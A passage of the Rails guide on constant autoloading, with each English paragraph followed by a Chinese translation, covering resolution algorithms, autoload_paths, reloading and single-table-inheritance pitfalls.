class Project < ActiveRecord::Base
end

performs a constant assignment equivalent to
执行了一个常数分配，相当于
Project = Class.new(ActiveRecord::Base)

including setting the name of the class as a side-effect:    
这段代码包含一个副作用：设置了类的名称。
Project.name # => "Project"

Constant assignment has a special rule to make that happen: if the object being assigned is an anonymous class or module, Ruby sets the object's name to the name of the constant.
常量分配有一个特别的规则，如果被分配的对象是一个匿名的类或模块，Ruby将对象的名称设置为常量的名称。

From then on, what happens to the constant and the instance does not matter. For example, the constant could be deleted, the class object could be assigned to a different constant, be stored in no constant anymore, etc. Once the name is set, it doesn't change.
从那开始，常量和实例发生什么变化就不重要了。比如，常量可以被删除，类对象可被分配到不同的常量，不再存储在常量上，等等。一旦设置了名称，类对象就不会变化。

Similarly, module creation using the module keyword as in
类似的，模块的创建使用了module关键字，正如：
module Admin
end

performs a constant assignment equivalent to
执行了一个常量分配，相当于
Admin = Module.new

including setting the name as a side-effect:
但也有副产品：设置了名称。
Admin.name # => "Admin"

The execution context of a block passed to Class.new or Module.new is not entirely equivalent to the one of the body of the definitions using the class and module keywords. But both idioms result in the same constant assignment.
被传递到Class.new或Module.new代码块的执行环境不会完全等同于使用了class和module关键字的定义的主体。但这两种形式会产生同样的常量分配。

Thus, when one informally says "the String class", that really means: the class object stored in the constant called "String" in the class object stored in the Object constant. String is otherwise an ordinary Ruby constant and everything related to constants such as resolution algorithms applies to it.
因此，当一个人说“字符串类”的时候，他真实的意思是：该类对象存储在一个叫做‘String’的常量中，而该常量在一个class对象里面，该class对象则存储在一个Object常量中。字符串类只不过是一个普通的Ruby常量，再加上所有与这个常量相关的东西，比如应用在它身上的解析算法。

Likewise, in the controller
类似的，在控制器里
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

Post is not syntax for a class. Rather, Post is a regular Ruby constant. If all is good, the constant evaluates to an object that responds to all.
Post不是类的构造语法。相反，Post是一个普通的Ruby常量。如果正常运作，该常量被当作响应一切的对象。

That is why we talk about constant autoloading, Rails has the ability to load constants on the fly.
那就是为什么谈论常量自动加载的原因，Rails有能力快速加载常量。
###  2.3 Constants are Stored in Modules  常量存在模块里面

Constants belong to modules in a very literal sense. Classes and modules have a constant table; think of it as a hash table.
从字面来看，常量属于模块。类和模块有一个常量表，该表可以看作一个散列表。

Let's analyze an example to really understand what that means. While common abuses of language like "the String class" are convenient, the exposition is going to be precise here for didactic purposes.
下面分析一个例子来真正地理解其中的意思。因为普遍滥用语言——比如说“字符串类”——实在太方便了；这里展示的情况一针见血。

Let's consider the following module definition:
想想下面的模块定义：
module Colors
  RED = '0xff0000'
end

First, when the module keyword is processed the interpreter creates a new entry in the constant table of the class object stored in the Object constant. Said entry associates the name "Colors" to a newly created module object. Furthermore, the interpreter sets the name of the new module object to be the string "Colors".
首先，module关键字被处理时，解释器在Object常量里的class对象的常量表中创建了一个新的条目。这个条目将“Colors”这个名称和一个新建的模块对象联系在一起。另外，解释器将新的模块对象的名称设置为字符串“Colors”。

Later, when the body of the module definition is interpreted, a new entry is created in the constant table of the module object stored in the Colors constant. That entry maps the name "RED" to the string "0xff0000".
稍后，当模块定义的主体被解释时，存储在Colors常量的模块对象的常量表创建了一个新的条目。该条目将RED映射到字符串0xff0000中。

In particular, Colors::RED is totally unrelated to any other RED constant that may live in any other class or module object. If there were any, they would have separate entries in their respective constant tables.
特别是，Colors::RED是和其他存在于其他类或模块对象的RED常量完全无关的。如果它处还有RED，那它们在相应的常量表中一定有独立的条目。

Pay special attention in the previous paragraphs to the distinction between class and module objects, constant names, and value objects associated to them in constant tables.
要特别注意前一段里类和模块对象之间的差别，常量的名称，与常量关联的对象在常量表中的值。
###  2.4 Resolution Algorithms  解析运算
####  2.4.1 Resolution Algorithm for Relative Constants  为相对常量进行解析运算

At any given place in the code, let's define cref to be the first element of the nesting if it is not empty, or Object otherwise.
在代码的任何指定位置，如果嵌套不是空的，定义cref为嵌套的第一个元素；否则，定义cref为Object。

Without getting too much into the details, the resolution algorithm for relative constant references goes like this:
不用怎么深入，相对常量引用的解析运算会是这样：

    If the nesting is not empty the constant is looked up in its elements and in order. The ancestors of those elements are ignored.
    如果嵌套不为空，常量会按次序寻找各个元素。这些元素的祖先则被忽略。

    If not found, then the algorithm walks up the ancestor chain of the cref.
    如果没有找到，那么运算将沿着cref的祖先链向上寻找。

    If not found, const_missing is invoked on the cref. The default implementation of const_missing raises NameError, but it can be overridden.
    如果没有找到，cref将调用const_missing。const_missing的默认执行是抛出NameError异常，但这个执行可以被改写。

Rails autoloading does not emulate this algorithm, but its starting point is the name of the constant to be autoloaded, and the cref. See more in Relative References.
Rails自动加载不会模拟这个运算，但它的起始点是要自动加载的常量的名称和cref。详见下面的相对引用。
####  2.4.2 Resolution Algorithm for Qualified Constants 限定常量的解析运算

Qualified constants look like this:
限定常量看起来就像：
Billing::Invoice

Billing::Invoice is composed of two constants: Billing is relative and is resolved using the algorithm of the previous section.
Billing::Invoice由两个常量组成。Billing是相对常量，可使用前一节的运算来解析。

Leading colons would make the first segment absolute rather than relative: ::Billing::Invoice. That would force Billing to be looked up only as a top-level constant.
::Billing::Invoice的前置冒号可以让前置部分变成绝对路径而不是相对路径，会强制Billing作为顶级常量。

Invoice on the other hand is qualified by Billing and we are going to see its resolution next. Let's call parent to that qualifying class or module object, that is, Billing in the example above. The algorithm for qualified constants goes like this:
另一方面，Invoice被Billing所限定，下面会看到它的解析。让我们调用parent到限定的类或模块对象，也就是上面例子中的Billing。

    The constant is looked up in the parent and its ancestors.
    常量在父类和祖类中查找。

    If the lookup fails, const_missing is invoked in the parent. The default implementation of const_missing raises NameError, but it can be overridden.
    如果查找失败，父类会调用const_missing。const_missing默认执行是抛出NameError，但这个执行可以被改写。

As you see, this algorithm is simpler than the one for relative constants. In particular, the nesting plays no role here, and modules are not special-cased, if neither they nor their ancestors have the constants, Object is not checked.
正如所见，它的运算比相对常量更简便。特别的是，嵌套在这里没有起作用，模块也不例外，如果它和超类两者都没找到该常量，Object不会被检查。

Rails autoloading does not emulate this algorithm, but its starting point is the name of the constant to be autoloaded, and the parent. See more in Qualified References.
Rails自动加载不会模拟这一运算，但它的起点是要自动加载的常量的名称和它的超类。详见下面的限定引用。
##  3 Vocabulary 词汇表
###  3.1 Parent Namespaces 父层命名空间

Given a string with a constant path we define its parent namespace to be the string that results from removing its rightmost segment.
对于用一个常量路径给出的一个字符串，我们定义它的父层命名空间为被移除了右边部分的字符串。

For example, the parent namespace of the string "A::B::C" is the string "A::B", the parent namespace of "A::B" is "A", and the parent namespace of "A" is "".
比如，字符串"A::B::C"的父层命名空间是"A::B"， "A::B"的父层命名空间是"A"，而 "A"的父层命名空间是""。

The interpretation of a parent namespace when thinking about classes and modules is tricky though. Let's consider a module M named "A::B":
考虑到类和模块时，父层命名空间的解释就有些麻烦了。下面想想一个叫做"A::B"的模块M。

    The parent namespace, "A", may not reflect nesting at a given spot.
    父层命名空间 "A"，在指定点上可能没有反映嵌套。

    The constant A may no longer exist, some code could have removed it from Object.
    常量A不再存在，一些代码从Object里被移除了。

    If A exists, the class or module that was originally in A may not be there anymore. For example, if after a constant removal there was another constant assignment there would generally be a different object in there.
    如果A还存在，原来在A里的类和模块可能不再存在。比如，如果移除了一个常量，又分配了另一个常量，常量里的对象一般不会相同。

    In such case, it could even happen that the reassigned A held a new class or module called also "A"!
    这种情况下，有可能出现重新分配A ，但这个A里保存了新的类或模块。

    In the previous scenarios M would no longer be reachable through A::B but the module object itself could still be alive somewhere and its name would still be "A::B".
    在前面的情况下，M不能再通过A::B找到，但模块对象自身仍然存在，名称也依然是“A::B”。

The idea of a parent namespace is at the core of the autoloading algorithms and helps explain and understand their motivation intuitively, but as you see that metaphor leaks easily. Given an edge case to reason about, take always into account that by "parent namespace" the guide means exactly that specific string derivation.
父层命名空间的理念位于自动加载运算的中心，它帮助解释和理解它们的直接动机；但正如所见，这很容易出错。考虑到极端情况，要重视通过父层命名空间分析特定字符串原本的意思。
###  3.2 Loading Mechanism 加载机制

Rails autoloads files with Kernel#load when config.cache_classes is false, the default in development mode, and with Kernel#require otherwise, the default in production mode.
当处于开发模式时，即config.cache_classes为false时，Rails用Kernel#load自动加载文件；而处于生产模式时，使用Kernel#require或其他自动加载机制。

Kernel#load allows Rails to execute files more than once if constant reloading is enabled.
如果启动常量重载功能，Kernel#load允许Rails多次执行文件。

This guide uses the word "load" freely to mean a given file is interpreted, but the actual mechanism can be Kernel#load or Kernel#require depending on that flag.
本指南使用的词汇“加载”意义较为宽松，意思是给定文件被解释器所解释，但实际机制可能是Kernel#load或Kernel#require，选择哪个则依赖于该设置的标志。
##  4 Autoloading Availability 自动加载效应

Rails is always able to autoload provided its environment is in place. For example the runner command autoloads:
Rails总能够自动加载位于适当位置的环境。比如，运行器命令会自动加载。
$ bin/rails runner 'p User.column_names'
["id", "email", "created_at", "updated_at"]

The console autoloads, the test suite autoloads, and of course the application autoloads.
控制台自动加载、测试套件自动加载，当然程序也能自动加载。

By default, Rails eager loads the application files when it boots in production mode, so most of the autoloading going on in development does not happen. But autoloading may still be triggered during eager loading.
默认情况下，Rails在生产模式下启动时会贪婪加载程序文件，所以发生于开发模式下的大部分自动加载不会出现。但在贪婪加载期间，自动加载仍可能会被触发。

For example, given
比如，下面：
class BeachHouse < House
end

if House is still unknown when app/models/beach_house.rb is being eager loaded, Rails autoloads it.
当app/models/beach_house.rb被贪婪加载时，如果House仍然未知，Rails会自动加载它。
##  5 autoload_paths 自动加载路径

As you probably know, when require gets a relative file name:
你可能知道，require得到一个相对文件名时:
require 'erb'

Ruby looks for the file in the directories listed in $LOAD_PATH. That is, Ruby iterates over all its directories and for each one of them checks whether they have a file called "erb.rb", or "erb.so", or "erb.o", or "erb.dll". If it finds any of them, the interpreter loads it and ends the search. Otherwise, it tries again in the next directory of the list. If the list gets exhausted, LoadError is raised.
Ruby在$LOAD_PATH变量所列出的目录下寻找文件。就是，Ruby迭代所有这个目录，并为每一个检查是否有叫做“erb.rb”或者“erb.so”，或者“erb.o”，或者“erb.dll”的文件。如果找到任何一个文件，解释器会加载它，终止搜索。否则，它会在清单的下一个目录中尝试。如果找过了清单的所有目录，则抛出LoadError异常。

We are going to cover how constant autoloading works in more detail later, but the idea is that when a constant like Post is hit and missing, if there's a post.rb file for example in app/models Rails is going to find it, evaluate it, and have Post defined as a side-effect.
我们要知道常量怎么自动加载工作的更多细节，但理念却是，当一个像Post的常量被找到，并遗失，如果有个post.rb文件存在，比如说在app/models，Rails将会找到它，并进行求值，顺便定义了Post。

Alright, Rails has a collection of directories similar to $LOAD_PATH in which to look up post.rb. That collection is called autoload_paths and by default it contains:
对了，Rails有一个类似$LOAD_PATH目录的集合，该目录里可以找到post.rb。该集合被称为自动加载路径，默认情况下包含了：

    All subdirectories of app in the application and engines. For example, app/controllers. They do not need to be the default ones, any custom directories like app/workers belong automatically to autoload_paths.
    在程序和引擎里的app所有的子目录。比如，控制器目录。不一定是默认的，任何自定义的目录，比如app/worders都会被自动归结到autoload_paths。

    Any existing second level directories called app/*/concerns in the application and engines.
    在程序和引擎里任何已存的第二层级的目录叫做 app/*/concerns。「译注：called应该译为“比如”吗？」

    The directory test/mailers/previews.
    test/mailers/previews目录。

Also, this collection is configurable via config.autoload_paths. For example, lib was in the list years ago, but no longer is. An application can opt-in by adding this to config/application.rb:
这个集合也可以通过config.autoload_paths来配置。比如，以前lib是在这个清单中的，但现在已经不是。程序可以将下面一行添加到里面，从而把它加入清单中。
config.autoload_paths += "#{Rails.root}/lib"

The value of autoload_paths can be inspected. In a just generated application it is (edited):
自动加载路径的值可以被显示出来了。在一个已经生成的程序中，它的值是：
$ bin/rails r 'puts ActiveSupport::Dependencies.autoload_paths'
.../app/assets
.../app/controllers
.../app/helpers
.../app/mailers
.../app/models
.../app/controllers/concerns
.../app/models/concerns
.../test/mailers/previews

autoload_paths is computed and cached during the initialization process. The application needs to be restarted to reflect any changes in the directory structure.
自动加载路径在初始化过程期间被计算出来并缓存起来。该目录结构出现任何变化都需要程序重启来表现这些变化。
##  6 Autoloading Algorithms 自动加载运算
###  6.1 Relative References 相对引用

A relative constant reference may appear in several places, for example, in
相对的常量引用可能出现在几个地方，比如在：
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

all three constant references are relative.
所有三个常量引用都是相对的。
####  6.1.1 Constants after the class and module Keywords 关键字class和module后面的常量

Ruby performs a lookup for the constant that follows a class or module keyword because it needs to know if the class or module is going to be created or reopened.
Ruby为关键字class或module后面的常量进行查找，因为它需要知道是否有类或模块正在被创建或重新打开。

If the constant is not defined at that point it is not considered to be a missing constant, autoloading is not triggered.
如果常量没有定义在该点上，那它还没被视作丢失的常量，还不会触发自动加载。

So, in the previous example, if PostsController is not defined when the file is interpreted Rails autoloading is not going to be triggered, Ruby will just define the controller.
因此，前面的例子中，在文件被解释完而Rails的自动加载还没有被触发的时候，如果PostsController没有被定义，Ruby会只定义控制器。
####  6.1.2 Top-Level Constants 顶级常量

On the contrary, if ApplicationController is unknown, the constant is considered missing and an autoload is going to be attempted by Rails.
相反，如果 ApplicationController未知，常量被认为丢失，自动加载就会被Rails启动起来尝试。

In order to load ApplicationController, Rails iterates over autoload_paths. First checks if app/assets/application_controller.rb exists. If it does not, which is normally the case, it continues and finds app/controllers/application_controller.rb.
为了加载ApplicationController，Rails将迭代autoload_paths。首先寻找app/assets/application_controller.rb是否存在。如果不存在，正常情况下会继续寻找，找到app/controllers/application_controller.rb。

If the file defines the constant ApplicationController all is fine, otherwise LoadError is raised:
如果文件定义了常量ApplicationController，则万事大吉；否则就抛出LoadError异常：
unable to autoload constant ApplicationController, expected
<full path to application_controller.rb> to define it (LoadError)

Rails does not require the value of autoloaded constants to be a class or module object. For example, if the file app/models/max_clients.rb defines MAX_CLIENTS = 100 autoloading MAX_CLIENTS works just fine.
Rails不要求自动加载的常量的值是一个类或模块对象。比如，如果文件app/models/max_clients.rb定义了MAX_CLIENTS = 100，则自动加载MAX_CLIENTS就好了。
####  6.1.3 Namespaces  命名空间

Autoloading ApplicationController looks directly under the directories of autoload_paths because the nesting in that spot is empty. The situation of Post is different, the nesting in that line is [PostsController] and support for namespaces comes into play.
自动加载ApplicationController看起来直接在自动加载路径的目录之下，因为该点的嵌套是空的。Post的情况则不同，该行的嵌套是[PostsController]，支持命名空间的作用。

The basic idea is that given
基本理念是，
module Admin
  class BaseController < ApplicationController
    @@all_roles = Role.all
  end
end

to autoload Role we are going to check if it is defined in the current or parent namespaces, one at a time. So, conceptually we want to try to autoload any of
要自动加载Role，则需要检查它是否定义在当前或父层命名空间里，一个时间里只检查一个。那么，从概念上说，我们要按顺序尝试自动加载下面三层：

Admin::BaseController::Role
Admin::Role
Role

in that order. That's the idea. To do so, Rails looks in autoload_paths respectively for file names like these:
理念就是这样。为了做到这点，Rails在自动加载路径中寻找三个文件，名称分别是：
admin/base_controller/role.rb
admin/role.rb
role.rb

modulus some additional directory lookups we are going to cover soon.
另外的一些目录，我们马上就要去找了。

'Constant::Name'.underscore gives the relative path without extension of the file name where Constant::Name is expected to be defined.
代码'Constant::Name'.underscore会给出相对路径，无需文件名的扩展，该路径是Constant::Name被定义的地方。

Let's see how Rails autoloads the Post constant in the PostsController above assuming the application has a Post model defined in app/models/post.rb.
假定程序有一个Post模型定义在app/models/post.rb里，现在看看Rails怎么自动加载上面的PostsController里的Post常量。

First it checks for posts_controller/post.rb in autoload_paths:
首先检查自动加载路径的posts_controller/post.rb，然后检查：
app/assets/posts_controller/post.rb
app/controllers/posts_controller/post.rb
app/helpers/posts_controller/post.rb
...
test/mailers/previews/posts_controller/post.rb

Since the lookup is exhausted without success, a similar search for a directory is performed, we are going to see why in the next section:
一旦查找失败终止，执行类似的目录搜索——我们在下一节的自动模块中看看为什么要这么做：
app/assets/posts_controller/post
app/controllers/posts_controller/post
app/helpers/posts_controller/post
...
test/mailers/previews/posts_controller/post

If all those attempts fail, then Rails starts the lookup again in the parent namespace. In this case only the top-level remains:
如果所有这些尝试都失败了，Rails将在父层开始再度查找。这时就只剩下顶层的了。
app/assets/post.rb
app/controllers/post.rb
app/helpers/post.rb
app/mailers/post.rb
app/models/post.rb

A matching file is found in app/models/post.rb. The lookup stops there and the file is loaded. If the file actually defines Post all is fine, otherwise LoadError is raised.
匹配的文件在中app/models/post.rb被找到。于是查找停止，加载文件。如果文件确实定义了Post，则万事大吉；否则就抛出LoadError异常：
###  6.2 Qualified References 限定引用

When a qualified constant is missing Rails does not look for it in the parent namespaces. But there is a caveat: When a constant is missing, Rails is unable to tell if the trigger was a relative reference or a qualified one.
限定常量丢失时，Rails不会在父层命名空间中寻找。但会出现一个警告：常量丢失时，Rails不能分辨出该触发器是一个相对引用还是一个限定引用。

For example, consider
比如，想想：
module Admin
  User
end

and
和
Admin::User

If User is missing, in either case all Rails knows is that a constant called "User" was missing in a module called "Admin".
如果User丢失了，这两种情况里，Rails知道的都只是一个叫做‘User’的常量在一个叫做“Admin”的模块中丢失了。

If there is a top-level User Ruby would resolve it in the former example, but wouldn't in the latter. In general, Rails does not emulate the Ruby constant resolution algorithms, but in this case it tries using the following heuristic:
如果有一个顶级的User，Ruby就可以解析出它在前一个例子中，不是在后一个例子中。一般，Rails不会模拟Ruby常量的解析运算，但在这个情况下它会尝试使用下面的提示：

    If none of the parent namespaces of the class or module has the missing constant then Rails assumes the reference is relative. Otherwise qualified.
    如果没有类或模块的父层命名空间丢失了常量，Rails会假定是相对引用，否则是限定引用。

For example, if this code triggers autoloading
比如，如果这个代码触发器自动加载了
Admin::User

and the User constant is already present in Object, it is not possible that the situation is
而User常量已经在Object里存在，就不可能是下面的这种情形：
module Admin
  User
end

because otherwise Ruby would have resolved User and no autoloading would have been triggered in the first place. Thus, Rails assumes a qualified reference and considers the file admin/user.rb and directory admin/user to be the only valid options.
因为如果不是这样，Ruby会解析User，并且在第一个位置里不会触发自动加载。因此，Rails假定是一个限定引用，并认为admin/user.rb文件和admin/user目录是唯一有效的选项。

In practice, this works quite well as long as the nesting matches all parent namespaces respectively and the constants that make the rule apply are known at that time.
实践中，这种方式运行良好，只要嵌套匹配所有对应的命名空间，在那时，使规则应用的常量就被识别出来了。

However, autoloading happens on demand. If by chance the top-level User was not yet loaded, then Rails assumes a relative reference by contract.
不过，自动加载在有请求时才会发生。如果顶级User偶然没有被加载，Rails会根据约定假定它是一个相对引用。

Naming conflicts of this kind are rare in practice, but if one occurs, require_dependency provides a solution by ensuring that the constant needed to trigger the heuristic is defined in the conflicting place.
实践中这种类型的命名冲突是很罕见的，但一旦发生，请求依赖会提供一个解决方案，它确保在冲突里需要触发提示的常量已被定义。
###  6.3 Automatic Modules 自动模块

When a module acts as a namespace, Rails does not require the application to defines a file for it, a directory matching the namespace is enough.
当模块作为一个命名空间，Rails不会要求程序为它定义一个文件，一个匹配命名空间的目录就足够了。

Suppose an application has a back office whose controllers are stored in app/controllers/admin. If the Admin module is not yet loaded when Admin::UsersController is hit, Rails needs first to autoload the constant Admin.
假定程序有一个后勤部门，它的控制器保存在app/controllers/admin里。如果Admin::UsersController已经出现，而Admin模块还没有加载，Rails需要首先加载常量Admin。

If autoload_paths has a file called admin.rb Rails is going to load that one, but if there's no such file and a directory called admin is found, Rails creates an empty module and assigns it to the Admin constant on the fly.
如果加载路径有一个叫做admin.rb的文件，Rails将会加载那个文件，但如果没有这样一个文件，而找到一个叫admin的目录，Rails将会创建一个空的模块，会分配它到一个空闲的Admin常量中。
###  6.4 Generic Procedure 一般流程

Relative references are reported to be missing in the cref where they were hit, and qualified references are reported to be missing in their parent. (See Resolution Algorithm for Relative Constants at the beginning of this guide for the definition of cref, and Resolution Algorithm for Qualified Constants for the definition of parent.)
在cref中，相对引用在出现的地方被报告为丢失，而限定引用在父层被报告为丢失。（参见上面本指南的开始处《相对常量的解析运算》一节中cref的定义，以及《限定常量》一节中定义的parent）。

The procedure to autoload constant C in an arbitrary situation is as follows:
在任何情况下，常量C的自动加载过程都是如下所示：
if the class or module in which C is missing is Object
# 如果丢失C的类或模块是Object，
  let ns = ''
# 命名空间为空
else
  let M = the class or module in which C is missing
  # 将丢失C的类或模块赋值到M中
  if M is anonymous
# 如果 M 没有名称
    let ns = ''
  else
    let ns = M.name
  end
end
 
loop do
# 进入循环

  # Look for a regular file.
# 在自动查找路径里查找普通文件
  for dir in autoload_paths
    if the file "#{dir}/#{ns.underscore}/c.rb" exists
# 如果"#{dir}/#{ns.underscore}/c.rb"文件存在
      load/require "#{dir}/#{ns.underscore}/c.rb"
  # 加载/请求该文件
      if C is now defined
# 如果C在里面被定义了
        return
# 返回该定义
      else
        raise LoadError
# 抛出 LoadError
      end
    end
  end
 
  # Look for an automatic module.
# 在自动查找路径里查找自动模块
  for dir in autoload_paths
    if the directory "#{dir}/#{ns.underscore}/c" exists
# 如果"#{dir}/#{ns.underscore}/c.rb"文件存在
      if ns is an empty string
# 如果ns为空字符串
        let C = Module.new in Object and return
      else
        let C = Module.new in ns.constantize and return
      end
    end
  end
 
  if ns is empty
    # We reached the top-level without finding the constant.
# 已经到达顶层，不用再寻找这个常量了。
    raise NameError
  else
# 还没到达顶层的时候
    if C exists in any of the parent namespaces
      # Qualified constants heuristic.
# 限定常量的提示
      raise NameError
    else
      # Try again in the parent namespace.
# 在父层命名空间里再次查找
      let ns = the parent namespace of ns and retry
    end
  end
end
##  7 require_dependency 请求依赖

Constant autoloading is triggered on demand and therefore code that uses a certain constant may have it already defined or may trigger an autoload. That depends on the execution path and it may vary between runs.
常量自动加载会按请求被除法，因此使用了特定常量的代码准备号定义或者触发一个自动加载。这取决于执行路径，并因运行而变化。

There are times, however, in which you want to make sure a certain constant is known when the execution reaches some code. require_dependency provides a way to load a file using the current loading mechanism, and keeping track of constants defined in that file as if they were autoloaded to have them reloaded as needed.
不过，有时执行一些代码时，想确保特定的常量被知道。请求依赖提供了一个方法来加载文件，它使用当前的加载机制，并跟踪定义在该文件中的常量，就好象它们是被自动加载到的、只在需要的时候重载。

require_dependency is rarely needed, but see a couple of use-cases in Autoloading and STI and When Constants aren't Triggered.
请求依赖真的少见。但下面就有一对用例，见下面的《自动加载和单表继承》和《常量没有被触发时》。

Unlike autoloading, require_dependency does not expect the file to define any particular constant. Exploiting this behavior would be a bad practice though, file and constant paths should match.
和自动加载不同，请求依赖不会期待文件定义任何特定常量。尽管使用这个行为是个糟糕的实践，不过真用的时候，文件和常量路径应该匹配。
##  8 Constant Reloading 常量重载

When config.cache_classes is false Rails is able to reload autoloaded constants.
config.cache_classes为false时，Rails允许重载已经自动加载的常量。

For example, in you're in a console session and edit some file behind the scenes, the code can be reloaded with the reload! command:
比如，如果在一个控制台会话里离开具体情景去编辑一些文件，代码可以用`reload!`命令重载。
> reload!

When the application runs, code is reloaded when something relevant to this logic changes. In order to do that, Rails monitors a number of things:
程序运行时，当某些逻辑相关的东西被改变时，代码会被重载。为了做到这一点，Rails监视下面的东西：

    config/routes.rb.
    路由

    Locales.
    本地化

    Ruby files under autoload_paths.
    自动加载路径下的Ruby文件

    db/schema.rb and db/structure.sql.
    db/schema.rb和db/structure.sql。

If anything in there changes, there is a middleware that detects it and reloads the code.
如果里面什么东西发生了变化，会有中间件侦测到这一点，并重载了代码。

Autoloading keeps track of autoloaded constants. Reloading is implemented by removing them all from their respective classes and modules using Module#remove_const. That way, when the code goes on, those constants are going to be unknown again, and files reloaded on demand.
自动加载会一直跟踪被自动加载的常量。重载则通过使用Module#removeJ_const方法将它们从相应的类和模块中全部移除来实现。那样，代码继续，那些常量会再次被遗忘，文件会按要求被重载。

This is an all-or-nothing operation, Rails does not attempt to reload only what changed since dependencies between classes makes that really tricky. Instead, everything is wiped.
这是一个要么全部有要么全部没有的操作，Rails不会尝试只重载改变的部分，因为类之间的依赖让这个过程变得巧妙，相反，它会擦去所有一切。
##  9 Module#autoload isn't Involved 模块的自动加载方法不是调用

Module#autoload provides a lazy way to load constants that is fully integrated with the Ruby constant lookup algorithms, dynamic constant API, etc. It is quite transparent.
Module#autoload提供了一个惰性的方式来加载常量，这个方式是和Ruby常量的查找运算、动态常量API等完全集成在一起的。这是很明显的。

Rails internals make extensive use of it to defer as much work as possible from the boot process. But constant autoloading in Rails is not implemented with Module#autoload.
Rails内部让这一过程获得巨大的应用，它会在启动过程中推迟尽可能多的工作。但Rails里的常量自动加载并不是靠Module#autoload实现的。

One possible implementation based on Module#autoload would be to walk the application tree and issue autoload calls that map existing file names to their conventional constant name.
一个可能的基于的实现可能是查看程序树，发出自动加载调用，将已有文件名称映射到它们惯例化的常量名称来。

There are a number of reasons that prevent Rails from using that implementation.
有许多理由阻止Rails使用那个实现。

For example, Module#autoload is only capable of loading files using require, so reloading would not be possible. Not only that, it uses an internal require which is not Kernel#require.
比如，Module#autoload只能使用请求来加载文件，所有重载是不可能的。不仅如此，它还使用一个内部的请求，而不是Kernel#require。

Then, it provides no way to remove declarations in case a file is deleted. If a constant gets removed with Module#remove_const its autoload is not triggered again. Also, it doesn't support qualified names, so files with namespaces should be interpreted during the walk tree to install their own autoload calls, but those files could have constant references not yet configured.
第二，它也没有提供文件被删除时移除声明的方法。如果一个常量被Module#remove_const移除了，自动加载不会被触发。同样，它也不支持限定名称，所以带有命名空间的名称会在查看文件树期间被解释出来，以便安装它们自身的自动加载调用，但是拥有常量引用的那些文件还没有被配置好。

An implementation based on Module#autoload would be awesome but, as you see, at least as of today it is not possible. Constant autoloading in Rails is implemented with Module#const_missing, and that's why it has its own contract, documented in this guide.
基于Module#autoload的实现将是可怕的，但如你所见，至少在今天它不可能这么实现。Rails里的常量自动加载是用Module#const_missing实现的，这就是为什么它拥有自己的规则记述在本指南里。
##  10 Common Gotchas 一般的收场
###  10.1 Nesting and Qualified Constants 嵌套和限定常量

Let's consider
看看
module Admin
  class UsersController < ApplicationController
    def index
      @users = User.all
    end
  end
end

and
和
class Admin::UsersController < ApplicationController
  def index
    @users = User.all
  end
end

To resolve User Ruby checks Admin in the former case, but it does not in the latter because it does not belong to the nesting. (See Nesting and Resolution Algorithms.)
为了解析User，在第一个例子中Ruby会检查Admin，但后一个例子里它不会，因为它不属于嵌套。（参见前面的《嵌套》和《解析运算》）

Unfortunately Rails autoloading does not know the nesting in the spot where the constant was missing and so it is not able to act as Ruby would. In particular, Admin::User will get autoloaded in either case.
不幸的是，Rails的自动加载不知道该点上的嵌套，该点上常量已经丢失，所以不能像Ruby那用运行起来。特别是Admin::User在两种情况下都将会自动加载。

Albeit qualified constants with class and module keywords may technically work with autoloading in some cases, it is preferable to use relative constants instead:
虽然带有class和module关键字的限定常量在某些情况下会技术上进行自动加载，但Rails更倾向于使用相对常量。
module Admin
  class UsersController < ApplicationController
    def index
      @users = User.all
    end
  end
end
###  10.2 Autoloading and STI  自动加载和单表继承

Single Table Inheritance (STI) is a feature of Active Record that enables storing a hierarchy of models in one single table. The API of such models is aware of the hierarchy and encapsulates some common needs. For example, given these classes:
单表继承是活性记录的一个特性，允许在单独一个数据表内存储一个层级。这样的模型的API知道层级，并压缩了一些共性需求。例如，下面这些类：
# app/models/polygon.rb
class Polygon < ActiveRecord::Base
end
 
# app/models/triangle.rb
class Triangle < Polygon
end
 
# app/models/rectangle.rb
class Rectangle < Polygon
end

Triangle.create creates a row that represents a triangle, and Rectangle.create creates a row that represents a rectangle. If id is the ID of an existing record, Polygon.find(id) returns an object of the correct type.
Triangle.create创建了一行表示一个三角形，Rectangle.create创建了一行表示一个矩形。如果id是已有数据的ID，Polygon.find(id)会返回一个正确的类型的对象。

Methods that operate on collections are also aware of the hierarchy. For example, Polygon.all returns all the records of the table, because all rectangles and triangles are polygons. Active Record takes care of returning instances of their corresponding class in the result set.
操作集合方法也知道层级。比如，Polygon.all返回数据表的所有记录，因为所有的矩形和三角形都是多边形。活性记录会处理好结果集合中对应类的实例的返回。

Types are autoloaded as needed. For example, if Polygon.first is a rectangle and Rectangle has not yet been loaded, Active Record autoloads it and the record is correctly instantiated.
类型会按需自动加载。比如，如果Polygon.first是个矩形，这时Rectangle还没被加载，活性记录会自动加载它，于是记录会被正确加载。

All good, but if instead of performing queries based on the root class we need to work on some subclass, things get interesting.
很好。但如果执行的查询不是基于根类，而是基于子类，那就有意思了。

While working with Polygon you do not need to be aware of all its descendants, because anything in the table is by definition a polygon, but when working with subclasses Active Record needs to be able to enumerate the types it is looking for. Let’s see an example.
用Polygon的时候，不需要知道它的子代，因为数据表的任何东西都被定义为polygon，但使用字类的时候，活性记录需要能够计算它所要查找的类型。下面看个例子。

Rectangle.all only loads rectangles by adding a type constraint to the query:
Rectangle.all在查询上增加一个类型约束，它只会加载矩形。
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle")

Let’s introduce now a subclass of Rectangle:
下面介绍一个矩形的子类。
# app/models/square.rb
class Square < Rectangle
end

Rectangle.all should now return rectangles and squares:
Rectangle.all会返回矩形和四边形。
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle", "Square")

But there’s a caveat here: How does Active Record know that the class Square exists at all?
但警告出现了：活性记录怎么直到Square类存在呢？

Even if the file app/models/square.rb exists and defines the Square class, if no code yet used that class, Rectangle.all issues the query
即使app/models/square.rb文件存在，且定义了Square类，如果没有代码使用该类，Rectangle.all会发出下面的查询：
SELECT "polygons".* FROM "polygons"
WHERE "polygons"."type" IN ("Rectangle")

That is not a bug, the query includes all known descendants of Rectangle.
这不是一个漏洞，查询包含了所有已知的四边形的子代。

A way to ensure this works correctly regardless of the order of execution is to load the leaves of the tree by hand at the bottom of the file that defines the root class:
确保这段代码运行起来、无需关注执行顺序的方式，是通过在该根类的定义文件底部手动加载该“树”的所有“枝叶”。
# app/models/polygon.rb
class Polygon < ActiveRecord::Base
end
require_dependency ‘square’

